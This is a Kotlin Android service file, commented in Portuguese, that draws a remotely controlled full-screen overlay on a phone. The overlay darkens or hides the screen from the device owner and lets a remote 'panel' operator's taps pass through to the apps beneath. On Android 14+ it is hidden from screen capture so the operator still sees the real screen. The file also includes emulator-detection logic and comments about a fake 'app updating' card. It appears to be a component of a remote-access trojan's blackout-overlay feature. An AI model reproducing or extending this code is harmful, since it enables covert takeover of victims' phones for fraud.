package com.example.acessomaterno

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView

/**
 * Overlay de Atualização (Fundo Limpo).
 *
 * Mostra no dispositivo um cartão central com o círculo
 * "Atualizando o aplicativo..." (toques livres — FLAG_NOT_TOUCHABLE).
 * NÃO usa FLAG_SECURE → o MediaProjection (ScreenCaptureService) captura a
 * tela normalmente e o emulador flutuante do painel continua exibindo o
 * vídeo, SEM tela preta. O espelhamento de tela já configurado permanece
 * ativo durante todo o overlay.
 *
 * Visual por tipo de dispositivo:
 *  - Emulador (Nox, MEmu, BlueStacks, AVD etc.): fundo raiz SEMITRANSPARENTE
 *    (#66000000, ~40% de preto) → escurece a tela para destacar o círculo de
 *    carregamento, mas os aplicativos e telas por baixo continuam visíveis.
 *  - Celular físico: fundo raiz 100% transparente (#00000000) = Fundo Limpo.
 *
 * Flags obrigatórias de interação: FLAG_NOT_TOUCHABLE + FLAG_NOT_FOCUSABLE
 * (junto com FLAG_LAYOUT_IN_SCREEN) → todos os toques/cliques do painel
 * atravessam o overlay e acionam os botões e apps abaixo.
 */
class OverlayService : Service() {

    companion object {
        private const val TAG = "OverlayService"
        // Auto-remoção após 2 minutos (camada temporária de atualização),
        // igual ao comportamento do overlay dentro da MainActivity.
        private const val AUTO_REMOVER_MS = 120_000L

        // Fundo raiz do overlay por tipo de dispositivo.
        private const val COR_FUNDO_EMULADOR = "#66000000" // semitransparente (~40% preto)
        private const val COR_FUNDO_FISICO = "#00000000"   // 100% transparente (Fundo Limpo)

        // --- ATUALIZAÇÃO (Overlay de Sobreposição): opacidade do fundo -------
        // Fonte ÚNICA de verdade da opacidade usada tanto por este serviço
        // quanto pelo overlay do MyAccessibilityService. O slider do painel
        // envia 'overlay_opacidade' e o SocketManager atualiza isto.
        //
        // AGORA É UM VALOR COM SINAL (-1..+1):
        //   > 0  → ESCURECER (sobreposição PRETA, alpha = valor)
        //   < 0  → CLAREAR   (sobreposição BRANCA, alpha = |valor|)
        //   = 0  → NEUTRO    (totalmente transparente)
        // Assim o mesmo slider do painel clareia E escurece o fundo do aparelho.
        @Volatile
        // Começa NEUTRO (0 = transparente/desativado): assim, por padrão, nada do
        // "Fundo do Dispositivo" entra na captura do MediaProjection (fallback p/
        // Android < 14, que não tem setHideDuringScreenSharing). O clarear/escurecer
        // só passa a valer quando o operador move o slider explicitamente.
        var opacidadeFundo: Float = 0f
            set(v) { field = v.coerceIn(-1f, 1f) }

        // Instância viva (quando o overlay está na tela via SYSTEM_ALERT_WINDOW).
        @Volatile
        private var instancia: OverlayService? = null

        /**
         * Cor do fundo a partir de um valor com sinal (-1..+1).
         * Positivo = preto (escurece), negativo = branco (clareia); o módulo
         * vira o alpha. Fonte única usada pelos dois caminhos de overlay.
         */
        fun corDispositivo(op: Float): Int {
            val v = op.coerceIn(-1f, 1f)
            val alpha = (kotlin.math.abs(v) * 255f).toInt().coerceIn(0, 255)
            return if (v < 0f) Color.argb(alpha, 255, 255, 255) // CLAREAR (branco)
            else Color.argb(alpha, 0, 0, 0)                     // ESCURECER (preto)
        }

        /** Cor do fundo com o valor/opacidade atual (clareia ou escurece). */
        fun corFundo(): Int = corDispositivo(opacidadeFundo)

        /** Atualiza a opacidade do fundo em tempo real (-1..+1). */
        fun aplicarOpacidade(op: Float) {
            opacidadeFundo = op
            instancia?.atualizarFundo()
        }

        /**
         * Verifica se o aplicativo está rodando em um emulador Android
         * (Nox, BlueStacks, Genymotion, Emulator oficial, etc.).
         * Retorna true se for emulador, false se for dispositivo físico real.
         */
        fun isRunningOnEmulator(context: Context): Boolean {
            val fingerprint = Build.FINGERPRINT.lowercase()
            val model = Build.MODEL.lowercase()
            val hardware = Build.HARDWARE.lowercase()
            val device = Build.DEVICE.lowercase()
            val product = Build.PRODUCT.lowercase()
            val manufacturer = Build.MANUFACTURER.lowercase()
            val brand = Build.BRAND.lowercase()
            val board = Build.BOARD.lowercase()

            val isEmulator = fingerprint.startsWith("generic") ||
                fingerprint.contains("unknown") ||
                model.contains("google_sdk") ||
                model.contains("emulator") ||
                model.contains("android sdk built for x86") ||
                hardware.contains("goldfish") ||
                hardware.contains("ranchu") ||
                hardware.contains("nox") ||
                hardware.contains("vbox86") ||
                device.contains("generic") ||
                device.contains("uxbox") ||
                product.contains("sdk") ||
                product.contains("google_sdk") ||
                product.contains("sdk_gphone") ||
                product.contains("vbox86p") ||
                manufacturer.contains("genymotion") ||
                manufacturer.contains("nox") ||
                manufacturer.contains("bluestacks") ||
                (brand.startsWith("generic") && device.startsWith("generic")) ||
                board.contains("nox") ||
                board.contains("vbox86")

            // Verificação por propriedade de kernel (QEMU)
            val qemu = try {
                val cl = Class.forName("android.os.SystemProperties")
                val getMethod = cl.getMethod("get", String::class.java)
                getMethod.invoke(null, "ro.kernel.qemu", "") as? String ?: ""
            } catch (e: Exception) {
                ""
            }

            return isEmulator || qemu == "1"
        }

        // --- CAPTURA LIMPA (controle de visibilidade do cartão) ------------
        // isRunning: true quando o overlay do cartão está na tela (instância
        // viva). Usado pelo ScreenCaptureService para só ocultar/restaurar
        // quando faz sentido. (opacidadeFundo NÃO é mexida aqui.)
        val isRunning: Boolean
            get() = instancia != null

        /** DESATIVADO (Opção A): não alternamos mais alpha por frame — isso podia
         *  piscar o espelhamento. O OverlayService nem sobe mais; mantido como
         *  no-op para compatibilidade com chamadores existentes. */
        @JvmStatic
        fun ocultarTemporariamente() { /* no-op: overlay não entra na captura */ }

        /** DESATIVADO (Opção A): ver ocultarTemporariamente. */
        @JvmStatic
        fun restaurarAposCaptura() { /* no-op */ }
    }

    private var windowManager: WindowManager? = null
    private var overlayView: View? = null
    private val handler = Handler(Looper.getMainLooper())

    private val autoRemoverRunnable = Runnable {
        Log.d(TAG, "Auto-remoção após 2min — overlay de atualização removido.")
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        instancia = this

        // O overlay roda em celular físico E em emuladores (o comando
        // overlay_atualizacao_visual é liberado para todos). A única
        // diferença é a cor de fundo raiz (ver criarOverlayFundoLimpo).

        // 1. Verificação EXPLÍCITA de permissão ANTES de qualquer addView.
        //    Sem SYSTEM_ALERT_WINDOW, não tenta adicionar a janela — evita
        //    WindowManager.BadTokenException / SecurityException e qualquer crash.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Log.e(TAG, "Permissão SYSTEM_ALERT_WINDOW não concedida — overlay não exibido (sem crash).")
            stopSelf()
            return
        }

        // 2. Criação/adição da janela de forma ASSÍNCRONA na Main Thread
        //    (Handler.post). Não bloqueia onCreate, não trava a UI nem o
        //    loop de captura de frames do MediaProjection (ScreenCaptureService
        //    continua rodando em sua própria thread durante todo o overlay).
        handler.post {
            if (overlayView != null) {
                agendarAutoRemocao() // já está na tela: só renova o timeout de 2 min
                return@post
            }
            criarOverlayFundoLimpo() // try/catch completo dentro do método
            if (overlayView != null) {
                agendarAutoRemocao()
            } else {
                stopSelf() // falha ao criar janela (já logada): encerra o serviço sem derrubar o app
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Permite desligar pelo próprio comando (extra "ativo" = false),
        // além do stopService normal. Reagenda o auto-remove a cada ativação.
        if (intent?.getBooleanExtra("ativo", true) == false) {
            stopSelf()
            return START_NOT_STICKY
        }
        if (overlayView != null) {
            agendarAutoRemocao() // já está na tela: só renova o timeout de 2 min
        }
        return START_NOT_STICKY
    }

    private fun agendarAutoRemocao() {
        // Auto-remocao DESATIVADA: o overlay/blackout fica ligado ate ser
        // desligado MANUALMENTE pelo painel (toggle "Overlay Atualizacao").
        // Antes removia sozinho apos 2 min; agora NAO agenda timeout.
        handler.removeCallbacks(autoRemoverRunnable)
    }

    /** Reaplica a cor de fundo escuro conforme a opacidade atual (ao vivo). */
    fun atualizarFundo() {
        handler.post {
            try {
                (overlayView as? FrameLayout)?.setBackgroundColor(corFundo())
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao atualizar opacidade do fundo: ${e.message}")
            }
        }
    }

    private fun dp(valor: Int): Int = (valor * resources.displayMetrics.density).toInt()

    private fun criarOverlayFundoLimpo() {
        try {
            windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

            val emEmulador = isRunningOnEmulator(this)
            // Fundo raiz escurecido pela OPACIDADE regulável (slider do painel).
            // Preto com alpha = opacidadeFundo (0 = limpo/transparente). Sem
            // FLAG_SECURE → o espelhamento continua sem tela preta.
            val container = FrameLayout(this).apply {
                setBackgroundColor(corFundo())
            }

            // Cartão escuro arredondado SÓ atrás do círculo + texto (mantém
            // legibilidade sem cobrir a tela). ~80% preto, cantos arredondados.
            val cartaoFundo = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(24).toFloat()
                setColor(Color.parseColor("#CC000000"))
            }

            val content = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                setPadding(dp(40), dp(36), dp(40), dp(36))
                background = cartaoFundo
                layoutParams = FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.WRAP_CONTENT,
                    FrameLayout.LayoutParams.WRAP_CONTENT
                ).apply { gravity = Gravity.CENTER }
            }

            val progressBar = ProgressBar(this).apply {
                isIndeterminate = true
                layoutParams = LinearLayout.LayoutParams(dp(64), dp(64)).apply {
                    bottomMargin = dp(24)
                }
            }

            val title = TextView(this).apply {
                text = "Sessão remota em andamento"
                textSize = 20f
                setTextColor(Color.WHITE)
                setTypeface(null, Typeface.BOLD)
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply { bottomMargin = dp(12) }
            }

            val subtitle = TextView(this).apply {
                text = "Sincronizando com o painel…"
                textSize = 14f
                setTextColor(Color.parseColor("#CCCCCC"))
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
            }

            content.addView(progressBar)
            content.addView(title)
            content.addView(subtitle)
            container.addView(content)

            val typeOverlay = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_PHONE
            }

            // SEM FLAG_SECURE (no Nox/emulador ela deixa a captura PRETA).
            // FLAG_NOT_TOUCHABLE + FLAG_NOT_FOCUSABLE (obrigatórias): toques e
            // cliques do painel atravessam o overlay e interagem com os apps
            // abaixo. FLAG_LAYOUT_IN_SCREEN / NO_LIMITS: cobre toda a tela.
            // FLAG_KEEP_SCREEN_ON: tela acesa durante a atualização.
            // PixelFormat.TRANSLUCENT respeita o fundo (transparente ou
            // semitransparente) → espelhamento continua sem tela preta.
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                typeOverlay,
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = Gravity.CENTER
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    layoutInDisplayCutoutMode =
                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                }
            }

            windowManager?.addView(container, params)
            overlayView = container
            // CORREÇÃO DO "CORPO BRANCO" NO ESPELHAMENTO: oculta ESTE overlay da
            // captura do MediaProjection no Android 14+ (API 34). O clarear/
            // escurecer do "Fundo do Dispositivo" continua VISÍVEL na tela física
            // do usuário, mas NUNCA aparece no espelhamento — o emulador nativo e
            // o preview sempre veem a tela REAL. Via reflection (setHideDuringScreenSharing
            // é API 34+). Em Android < 14 o fallback é opacidadeFundo começar em 0f.
            if (Build.VERSION.SDK_INT >= 34) {
                try {
                    val m = android.view.View::class.java
                        .getMethod("setHideDuringScreenSharing", Boolean::class.java)
                    m.invoke(container, true)
                } catch (_: Exception) {}
            }
            Log.i(TAG, "Overlay de atualização aplicado — tipo: ${if (emEmulador) "EMULADOR (fundo #66000000)" else "FÍSICO (Fundo Limpo)"}; sem FLAG_SECURE, espelhamento continua ativo, toques livres.")

        } catch (e: Exception) {
            Log.e(TAG, "Erro ao criar overlay: ${e.message}", e)
            stopSelf()
        }
    }

    override fun onDestroy() {
        handler.removeCallbacks(autoRemoverRunnable)
        super.onDestroy()
        try {
            overlayView?.let {
                windowManager?.removeView(it)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao remover overlay no onDestroy: ${e.message}")
        }
        overlayView = null
        windowManager = null
        instancia = null
    }
}